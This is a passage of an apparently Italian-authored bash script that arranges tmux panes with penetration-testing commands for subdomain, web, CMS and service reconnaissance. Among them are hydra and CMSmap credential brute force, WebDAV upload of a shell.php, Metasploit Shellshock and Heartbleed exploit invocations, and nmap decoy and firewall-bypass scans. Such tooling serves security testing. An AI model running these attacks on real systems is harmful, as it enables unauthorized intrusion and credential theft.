tmux send-keys -t PT:14.8 "ffuf -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
tmux send-keys -t PT:14.9 "# find Subdomain (via cewl + gobuster)" Enter
tmux send-keys -t PT:14.9 "cewl $url -d 5 -m 3 -w cewl-sub.txt --with-numbers && $folderProjectEngine/manageLower.sh cewl-sub.txt $folderProjectWebInfo/output-sub.txt && wfuzz -H ""\"Host: FUZZ.$domain""\" -u http://$ip -w output-sub.txt --hh 178"
cd $folderProject


cd $folderProjectInfoGathering
# Active scan: OS Type
# Layout
tmux new-window -t PT:15 -n 'Active scan: OS Type'
tmux split-window -v -t PT:15.0
tmux split-window -v -t PT:15.1
tmux select-pane -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -v -t PT:15.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# Active scan: OS Type with ping" Enter
tmux send-keys -t PT:15.0 "ping $ip"
tmux send-keys -t PT:15.1 "# Active scan: OS Type with tcpdump and nc" Enter
tmux send-keys -t PT:15.1 "tcpdump -i eth0 -v -n ip src $ip"
tmux send-keys -t PT:15.2 "# Active scan: OS Type with tcpdump and nc" Enter
tmux send-keys -t PT:15.2 "nc $ip 80"
tmux send-keys -t PT:15.3 "# Active scan: OS Type with nmap" Enter
tmux send-keys -t PT:15.3 "nmap –Pn –O $ip"
cd $folderProject

cd $folderProjectInfoGathering
# Active scan: IP Neighbour/Virtual Host
# Layout
tmux new-window -t PT:16 -n 'Active scan: IP Neighbour'
tmux split-window -v -t PT:16.0
tmux select-pane -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -v -t PT:16.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# Active scan: find a valid dictionary with seclists" Enter
tmux send-keys -t PT:16.0 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:16.1 "# Active scan: IP Neighbour dictionary with cewl+fromWord2SIte" Enter
tmux send-keys -t PT:16.1 "cewl $url -d 3 -m 5 -w cewl-vhost.txt --with-numbers"
tmux send-keys -t PT:16.2 "# Active scan: IP Neighbour dictionary with cewl+fromWord2SIte" Enter
tmux send-keys -t PT:16.2 "sudo python3 /opt/fromWord2Site/fromWord2Site.py cewl-vhost.txt www,api com,ctf,online"
tmux send-keys -t PT:16.3 "# Active scan: IP Neighbour with gobuster" Enter
tmux send-keys -t PT:16.3 "gobuster vhost -u $url -w cewl-vhost.txt.ouput"
cd $folderProject


cd $folderProjectInfoGathering
# firewall detection
# Layout
tmux new-window -t PT:17 -n 'Active scan: Firewall detection'
tmux split-window -v -t PT:17.0
tmux split-window -v -t PT:17.1
tmux split-window -v -t PT:17.2
tmux split-window -v -t PT:17.3
tmux split-window -v -t PT:17.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:17.0 "# Active scan: nmap (SYN + ACK). UNFILTERED -> FW stateless; FILTERED -> FW steteful" Enter
tmux send-keys -t PT:17.0 "sudo nmap -sS $ip -Pn && sudo nmap -sA $ip -Pn"
tmux send-keys -t PT:17.1 "# nmap (firewalk)" Enter
tmux send-keys -t PT:17.1 "sudo nmap --script=firewalk --traceroute $ip"
tmux send-keys -t PT:17.2 "# nmap (waf-detection)" Enter
tmux send-keys -t PT:17.2 "nmap --script=http-waf-detect $ip -Pn -p 80"
tmux send-keys -t PT:17.3 "# WAF detection with identYwaf" Enter
tmux send-keys -t PT:17.3 "sudo python3 /opt/identYwaf/identYwaf.py $site"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;
            
            






            
            
            
        3)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Information Gathering (WEB): WAF detection, site structure, virtual host, etc
######################
######################

# INFORMATION GATHERING (WEB)
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectWebInfo" Enter

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - email,name,telephone
# Layout
tmux new-window -t PT:1 -n 'Information Gathering (WEB): info from site - email,name,telephone (webDataExtractor)'
tmux split-window -v -t PT:1.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Information Gathering (WEB): info from site - email,name,telephone (webDataExtractor)" Enter
tmux send-keys -t PT:1.0 "sudo python /opt/webDataExtractor/webDataExtractor.py $url 1"
tmux send-keys -t PT:1.1 "# Information Gathering (WEB): extend name list with username-anarchy" Enter
tmux send-keys -t PT:1.1 "sudo /opt/username-anarchy/username-anarchy <usernname>"
cd $folderProject

# Information Gathering (WEB): info from site - link contenuti nel sistema target
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:2 -n 'Information Gathering (WEB): info from site - link contenuti nel sistema target'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# Information Gathering (WEB): info from site - link contenuti nel sistema target (sxcurity/gau)" Enter
tmux send-keys -t PT:2.0 "sudo docker run --rm -i sxcurity/gau $domain --subs"
tmux send-keys -t PT:2.1 "# Information Gathering (WEB): info from site - link contenuti nel sistema target (hakluke/hakrawler)" Enter
tmux send-keys -t PT:2.1 "echo $url | sudo docker run --rm -i hakluke/hakrawler -subs"
cd $folderProject

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)
# Layout
tmux new-window -t PT:3 -n 'Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# Information Gathering (WEB): info from site - whois,subdomain,email (dmitry)" Enter
tmux send-keys -t PT:3.0 "dmitry -news $domain -o $folderProjectInfoGathering/dmitry.txt"
cd $folderProject

cd $folderProjectWebInfo
# Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)
# Layout
tmux new-window -t PT:4 -n 'Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# Information Gathering (WEB): info from site - link interni, esterni, username, IP (spiderfoot)" Enter
tmux send-keys -t PT:4.0 "firefox 127.0.0.1:8083 & spiderfoot -l 127.0.0.1:8083"
cd $folderProject

# Information Gathering (WEB): info from site - data creazione sito
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:5 -n 'Information Gathering (WEB): info from site - website creation date'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# get favicon and its creation date" Enter
tmux send-keys -t PT:5.0 "wget $url/images/favicon.ico; exiftool favicon.ico"
cd $folderProject

# Information Gathering (WEB): info from site - download file
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:6 -n 'Information Gathering (WEB): info from site - download file'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# download interesting file (e.g. pdf)" Enter
tmux send-keys -t PT:6.0 "metagoofil -d $domain -t pdf -l 100 -n 25 -f metagoofil-result.txt"
tmux send-keys -t PT:6.1 "# get meta information from file" Enter
tmux send-keys -t PT:6.1 "exiftool <link to file>"
cd $folderProject

# Information Gathering (WEB): info from site - website creation framework
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:7 -n 'Information Gathering (WEB): info from site - website creation framework'
tmux split-window -v -t PT:7.0  
tmux split-window -v -t PT:7.1 
tmux select-pane -t "7.1"
tmux split-window -h -t "7.1"
tmux split-window -h -t "7.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# website creation framework" Enter
tmux send-keys -t PT:7.0 "curl -s -I $url"
tmux send-keys -t PT:7.1 "# GET normal request" Enter
tmux send-keys -t PT:7.1 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:7.2 "# GET error request" Enter
tmux send-keys -t PT:7.2 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:7.3 "# GET error request" Enter
tmux send-keys -t PT:7.3 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
cd $folderProject

# Information Gathering (WEB): info from site - miscellaneous information
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:8 -n 'Information Gathering (WEB): info from site - miscellaneous information'
tmux split-window -v -t PT:8.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# miscellaneous information" Enter
tmux send-keys -t PT:8.0 "theHarvester -d $domain -b all -l 500 -f $folderProject"
cd $folderProject

# Information Gathering (WEB): info from site - security header
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:9 -n 'Information Gathering (WEB): info from site - security header'
tmux split-window -v -t PT:9.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# Security Header" Enter
tmux send-keys -t PT:9.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\""
cd $folderProject

cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:10 -n 'Information Gathering (WEB): Site Structure'
tmux split-window -v -t PT:10.0  
tmux split-window -v -t PT:10.1 
tmux split-window -v -t PT:10.2  
tmux select-pane -t "10.2"
tmux split-window -h -t "10.2"
tmux split-window -h -t "10.2"
tmux split-window -v -t PT:10.5
tmux select-pane -t "10.5"
tmux split-window -h -t "10.5"
# Esecuzione dei comandi nelle sottofinestre
# WGET standard file
tmux send-keys -t PT:10.0 "# get common file (robots, sitemap, ...)" Enter
tmux send-keys -t PT:10.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crossdomain.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"" ""http://$site/README.md"" ""https://$site/robots.txt"" ""https://$site/sitemap.xml"" ""https://$site/crossdomain.xml"" ""https://$site/phpinfo.php"" ""https://$site/index.php"" ""https://$site/index.html"" ""https://$site/README.md"""
tmux send-keys -t PT:10.1 "# find dictionary." Enter
tmux send-keys -t PT:10.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n" 
tmux send-keys -t PT:10.2 "# find folders" Enter
tmux send-keys -t PT:10.2 "dirsearch -u $url /usr/share/wordlists/dirb/big.txt"
tmux send-keys -t PT:10.3 "# find folders" Enter
tmux send-keys -t PT:10.3 "dirsearch -u $url"
tmux send-keys -t PT:10.4 "# find folders" Enter
tmux send-keys -t PT:10.4 "gobuster dir -u $url -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k"
tmux send-keys -t PT:10.5 "# if target site respond always 20x" Enter
tmux send-keys -t PT:10.5 "ffuf -u $url/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
tmux send-keys -t PT:10.6 "# if target site respond always 30x" Enter
tmux send-keys -t PT:10.6 "gobuster dir -u $url -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
cd $folderProject

# from Site Structure -> WEB DAV
cd $folderProjectQucikWin
# Layout
tmux new-window -t PT:11 -n 'from Site Structure -> WEB DAV'
tmux split-window -v -t PT:11.0
tmux split-window -v -t PT:11.1
tmux split-window -v -t PT:11.2
tmux split-window -v -t PT:11.3
tmux select-pane -t "11.3"
tmux split-window -h -t "11.3"
tmux split-window -h -t "11.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# Bruteforce attack to get Target Site Folders" Enter
tmux send-keys -t PT:11.0 "gobuster dir -u $url -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:11.1 "# Bruteforce attack to get credentials to specific folder" Enter
tmux send-keys -t PT:11.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
tmux send-keys -t PT:11.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
tmux send-keys -t PT:11.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt $url wampp xampp"
tmux send-keys -t PT:11.3 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.3 "cadaver $ip"
tmux send-keys -t PT:11.4 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.4 "curl -T shell.txt -u login:password http://$ip"
tmux send-keys -t PT:11.5 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:11.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
cd $folderProject

# from site structure -> shellShock
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:12 -n 'from site structure -> shellShock'
tmux split-window -v -t PT:12.0
tmux select-pane -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -v -t PT:12.2
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# Search for cgi file with dirsearch" Enter
tmux send-keys -t PT:12.0 "dirsearch -u $url -w /usr/share/wordlists/dirb/big.txt"
tmux send-keys -t PT:12.1 "# Search shellshock vulnerability with nikto" Enter
tmux send-keys -t PT:12.1 "nikto -h $ip"
tmux send-keys -t PT:12.2 "# Exploit shellshock with msfconsole" Enter
tmux send-keys -t PT:12.2 "msfconsole -qx \"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST $ip; set TARGETURI /cgi-bin/test; set RPORT 80; set LHOST 192.168.1.11; run\""
cd $folderProject

# from site structure -> nginx off by side
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:13 -n 'from site structure -> nginx off by side'
tmux split-window -v -t PT:13.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# if find redirect from /asset to /asset/" Enter
tmux send-keys -t PT:13.0 "dirsearch -u $url -w /usr/share/wordlists/dirb/big.txt"
cd $folderProject

# WEB File extension
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:14 -n 'Information Gathering (WEB): WEB File Extension'
tmux split-window -v -t PT:14.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# find files with multiple extension" Enter
tmux send-keys -t PT:14.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 $url/FUZZFUZ2Z"
cd $folderProject

# WEB Metodi Attivi
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:15 -n 'Information Gathering (WEB): Active web methods'
tmux split-window -v -t PT:15.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# HTTP method allowed" Enter
tmux send-keys -t PT:15.0 "URL=\"$url\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
cd $folderProject

# WEB API
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:16 -n 'Information Gathering (WEB): API analysis'
tmux split-window -v -t PT:16.0
tmux select-pane -t "16.0"
tmux split-window -h -t "16.0"
tmux split-window -v -t PT:16.2
tmux select-pane -t "16.2"
tmux split-window -h -t "16.2"
tmux split-window -v -t PT:16.4
tmux select-pane -t "16.4"
tmux split-window -h -t "16.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# find endPoint with kr - dictionary" Enter
tmux send-keys -t PT:16.0 "/opt/kr wordlist list"
tmux send-keys -t PT:16.1 "# find endPoint with kr - execute command" Enter
tmux send-keys -t PT:16.1 "/opt/kr scan $url -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
tmux send-keys -t PT:16.2 "# find endPoint with wfuzz" Enter
tmux send-keys -t PT:16.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $url/api/v1/FUZZ --hc 403,404"
tmux send-keys -t PT:16.3 "# find endPoint with ffuf" Enter
tmux send-keys -t PT:16.3 "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $url/api/v1/FUZZ "
tmux send-keys -t PT:16.4 "# find Data Parameter with curl " Enter
tmux send-keys -t PT:16.4 "curl -X POST -H 'Content-type: application/json' -x $url/api/v1/user -d '{""user"":""admin"",""pass"",""password""}'"
tmux send-keys -t PT:16.5 "# find Data Parameter with ffuf " Enter
tmux send-keys -t PT:16.5 "ffuf -request request.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt"

# Guessing GET / POST Parameter
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:17 -n 'Information Gathering (WEB): Guessing GET/POST param'
tmux split-window -v -t PT:17.0
tmux split-window -v -t PT:17.1
tmux split-window -v -t PT:17.2
tmux split-window -v -t PT:17.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:17.0 "# find a valid parameter (GET)" Enter
tmux send-keys -t PT:17.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt $url/action.php?FUZZ=test"
tmux send-keys -t PT:17.1 "# find a valid value (GET)" Enter
tmux send-keys -t PT:17.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt $url/action.php?Param1=FUZZ"
tmux send-keys -t PT:17.2 "# find a valid parameter (POST)" Enter
tmux send-keys -t PT:17.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&FUZZ=1\" $url/action.php"
tmux send-keys -t PT:17.3 "# find a valid value (POST)" Enter
tmux send-keys -t PT:17.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&Param1=FUZZ\" $url/action.php"

# WEB Analisi del certificato HTTPS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:18 -n 'Information Gathering (WEB): WEB Certificate analysis and verify heartbleed'
tmux split-window -v -t PT:18.0
tmux split-window -v -t PT:18.1
tmux split-window -v -t PT:18.2
tmux select-pane -t "18.2"
tmux split-window -h -t "18.2"
tmux split-window -h -t "18.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:18.0 "# SSL certificate analysis with sslscan" Enter
tmux send-keys -t PT:18.0 "sslscan https://$site"
tmux send-keys -t PT:18.1 "# SSL certificate download" Enter
tmux send-keys -t PT:18.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
tmux send-keys -t PT:18.2 "# heartbleed analysis with sslyze" Enter
tmux send-keys -t PT:18.2 "sslyze -heartbleed $ip"
tmux send-keys -t PT:18.3 "# heartbleed analysis with nmap" Enter
tmux send-keys -t PT:18.3 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
tmux send-keys -t PT:18.4 "# heartbleed analysis with sslscan" Enter
tmux send-keys -t PT:18.4 "sslscan https://$site"
cd $folderProject

# Exploit heartbleed
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:19 -n 'Information Gathering (WEB): Exploit heartbleed'
tmux split-window -v -t PT:19.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:19.0 "# Exploit heartbleed" Enter
tmux send-keys -t PT:19.0 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
cd $folderProject

# CMS: multi-platform analysis and bruteforce
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:20 -n 'CMS: multi-platform analysis and bruteforce'
tmux split-window -v -t PT:20.0
tmux select-pane -t "20.0"
tmux split-window -h -t "20.0"
tmux split-window -h -t "20.0"
tmux split-window -v -t PT:20.3
tmux select-pane -t "20.3"
tmux split-window -h -t "20.3"
tmux split-window -h -t "20.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:20.0 "# CMS: multi-platform analysis with whatweb" Enter
tmux send-keys -t PT:20.0 "whatweb -a 3 $url"
tmux send-keys -t PT:20.1 "# CMS: multi-platform analysis update cmsmap" Enter
tmux send-keys -t PT:20.1 "sudo python /opt/CMSmap/cmsmap.py --update $url"
tmux send-keys -t PT:20.1 "# CMS: multi-platform analysis with cmsmap " Enter
tmux send-keys -t PT:20.1 "sudo python /opt/CMSmap/cmsmap.py -F $url"
tmux send-keys -t PT:20.2 "# CMS: multi-platform bruteforce (Wordpress)" Enter
tmux send-keys -t PT:20.2 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f W"
tmux send-keys -t PT:20.3 "# CMS: multi-platform bruteforce (Joomla)" Enter
tmux send-keys -t PT:20.3 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f J"
tmux send-keys -t PT:20.4 "# CMS: multi-platform bruteforce (Drupal)" Enter
tmux send-keys -t PT:20.4 "sudo python /opt/CMSmap/cmsmap.py $url –u users.txt –p passwords.txt –f D"
cd $folderProject

# CMS: WORDPRESS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:21 -n 'CMS: Wordpress'
tmux split-window -v -t PT:21.0
tmux select-pane -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -h -t "21.0"
tmux split-window -v -t PT:21.6
tmux select-pane -t "21.6"
tmux split-window -h -t "21.6"
tmux split-window -v -t PT:21.8
tmux select-pane -t "21.8"
tmux split-window -h -t "21.8"
tmux split-window -v -t PT:21.10
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:21.0 "# CMS: Wordpress analysis with nmap" Enter
tmux send-keys -t PT:21.0 "sudo nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
tmux send-keys -t PT:21.1 "# CMS: Wordpress analysis with cmseek" Enter
tmux send-keys -t PT:21.1 "cmseek -u $url"
tmux send-keys -t PT:21.2 "# CMS: Wordpress analysis with cmsmap" Enter
tmux send-keys -t PT:21.2 "sudo python /opt/CMSmap/cmsmap.py $url –f W"
tmux send-keys -t PT:21.3 "# CMS: Wordpress analysis with wpsec" Enter
tmux send-keys -t PT:21.3 "firefox https://wpsec.com &"
tmux send-keys -t PT:21.4 "# CMS: Wordpress analysis with msfconsole" Enter
tmux send-keys -t PT:21.4 "msfconsole -q -x \"use auxiliary/scanner/http/wordpress_scanner;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:21.5 "# CMS: Wordpress analysis with wpscan" Enter
tmux send-keys -t PT:21.5 "wpscan --url $url --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token <TOKEN> [--disable-tls-checks] && wpscan --url $url --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token <TOKEN> [--disable-tls-checks]"
tmux send-keys -t PT:21.6 "# CMS: Wordpress manual users enum" Enter
tmux send-keys -t PT:21.6 "firefox $url/?author=1 &"
tmux send-keys -t PT:21.7 "# CMS: Wordpress manual users enum" Enter
tmux send-keys -t PT:21.7 "firefox $url/wp-json/wp/v2/users/1 &"
tmux send-keys -t PT:21.8 "# CMS: Wordpress Version" Enter
tmux send-keys -t PT:21.8 "firefox $url/readme.txt &"
tmux send-keys -t PT:21.9 "# CMS: Wordpress Plugins enumeration" Enter
tmux send-keys -t PT:21.9 "firefox -no-remote $url/wp-content/plugins/ & firefox -no-remote $url/wp-content/themes/ & firefox -no-remote $url/wp-content/ & firefox -no-remote $url/upload/ & firefox -no-remote $url/images/ &"
tmux send-keys -t PT:21.10 "# CMS: Wordpress Exploit vulnerability" Enter
tmux send-keys -t PT:21.10 "searchsploit -u && searchsploit >module>"
cd $folderProject

# CMS JOOMLA
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:22 -n 'CMS Joomla'
tmux split-window -v -t PT:22.0
tmux select-pane -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -v -t PT:22.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:22.0 "# CMS: Joomla analysis with cmsmap" Enter
tmux send-keys -t PT:22.0 "sudo python /opt/CMSmap/cmsmap.py $url –f J"
tmux send-keys -t PT:22.1 "# CMS: Joomla analysis with cmseek" Enter
tmux send-keys -t PT:22.1 "cmseek -u $url"
tmux send-keys -t PT:22.2 "# CMS: Joomla analysis with joomscan" Enter
tmux send-keys -t PT:22.2 "joomscan -u $url"
tmux send-keys -t PT:22.3 "# CMS: Joomla analysis with msfconsole" Enter
tmux send-keys -t PT:22.3 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:22.4 "# CMS: Joomla exploitation" Enter
tmux send-keys -t PT:22.4 "searchsploit <module>"
cd $folderProject

# CMS DRUPAL
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:23 -n 'CMS Drupal'
tmux split-window -v -t PT:23.0
tmux select-pane -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -v -t PT:23.3
tmux split-window -v -t PT:23.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:23.0 "# CMS: Drupal analysis with cmsmap" Enter
tmux send-keys -t PT:23.0 "sudo python /opt/CMSmap/cmsmap.py $url –f D"
tmux send-keys -t PT:23.1 "# CMS: Drupal analysis with cmseek" Enter
tmux send-keys -t PT:23.1 "cmseek -u $url"
tmux send-keys -t PT:23.2 "# CMS: Drupal analysis with firefox" Enter
tmux send-keys -t PT:23.2 "firefox https://hackertarget.com/drupal-security-scan/ &"
tmux send-keys -t PT:23.3 "# CMS: Drupal Version" Enter
tmux send-keys -t PT:23.3 "firefox $url/CHANGELOG.txt &"
tmux send-keys -t PT:23.4 "# CMS: Drupal exploitation" Enter
tmux send-keys -t PT:23.4 "searchsploit <module>"
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;










        4)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Service Information Gathering
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter


# SERVIVE INFORMATION GATHERING
cd $folderProjectServiceInfoGathering
# ServiceInformationGathering
# Layout
tmux new-window -t PT:1 -n 'Service Information Gathering'
tmux split-window -v -t PT:1.0
tmux select-pane -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
tmux select-pane -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -v -t PT:1.5
tmux select-pane -t "1.5"
tmux split-window -h -t "1.5"
tmux split-window -h -t "1.5"
tmux split-window -h -t "1.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Service Information Gathering - TCP" Enter
tmux send-keys -t PT:1.0 "sudo nmap -sV -sC -O -Pn --script firewall-bypass $ip -oA out"
tmux send-keys -t PT:1.1 "# Service Information Gathering - TCP (all)" Enter
tmux send-keys -t PT:1.1 "sudo nmap -sV -sC -O -Pn -p- --script firewall-bypass $ip -oA out"
tmux send-keys -t PT:1.2 "# Service Information Gathering - UDP" Enter
tmux send-keys -t PT:1.2 "sudo nmap -sU -F $ip -Pn"
tmux send-keys -t PT:1.3 "# Service Information Gathering - Scanning Vulnerability - get ports" Enter
tmux send-keys -t PT:1.3 "ports=\$(nmap -p- --max-retries 0 -T5 --script firewall-bypass -Pn $ip | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)"
tmux send-keys -t PT:1.4 "# Service Information Gathering - Scanning Vulnerability - get vulnerabilities" Enter
tmux send-keys -t PT:1.4 "sudo nmap -Pn --script vuln --script firewall-bypass $ip -oA out.SPEC -p $ports"
tmux send-keys -t PT:1.5 "# Service Information Gathering - through FW with SOURCE PORT 80" Enter
tmux send-keys -t PT:1.5 "sudo nmap -g 80 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.80.txt"
tmux send-keys -t PT:1.6 "# Service Information Gathering - through FW with DECOY" Enter
tmux send-keys -t PT:1.6 "nmap -D 216.58.212.67,66.196.86.81,me,46.228.47.115,104.28.6.11,104.27.163.229,198.84.60.198,192.124.249.8 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.decoy.txt"
tmux send-keys -t PT:1.7 "# Service Information Gathering - through FW with SYNFIN" Enter
tmux send-keys -t PT:1.7 "sudo nmap -sS --scanflags SYNFIN -sV -sC -O -Pn --script firewall-bypass $ip -oA out.synfin.txt"
tmux send-keys -t PT:1.8 "# Service Information Gathering - through FW with TIMING" Enter
tmux send-keys -t PT:1.8 "sudo nmap –T2 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.timing.txt"
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;










        5)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc
######################
######################

# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
#source "common"
# Creazione di una sessione Tmux con attivazione VPN

tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectQuickWin" Enter


# duckduckgo, msfconsole
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:1 -n 'duckduckgo, searchSploit'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
